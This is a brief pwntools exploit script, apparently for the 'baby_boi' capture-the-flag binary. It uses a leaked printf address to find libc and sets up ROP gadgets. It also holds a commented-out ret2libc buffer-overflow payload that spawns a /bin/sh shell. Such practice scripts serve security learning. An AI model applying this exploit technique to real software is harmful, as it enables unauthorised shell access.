# coding: utf-8
from pwn import *
p = process("./baby_boi")
p.recvuntil(b"Here I am: ")
leak = p.recvline()
ileak = int(leak, 16)
poprdi = 0x0400793
justret = 0x040054e
elf = ELF("./baby_boi")
libc = elf.libc
libc.address = ileak - libc.sym.printf

#binsh = next(libc.search(b"/bin/sh"))
#syscall = libc.sym.system
#payload = b"A"*40 + p64(poprdi) + p64(binsh) + p64(justret) + p64(syscall)
#p.sendline(payload)
#p.interactive()
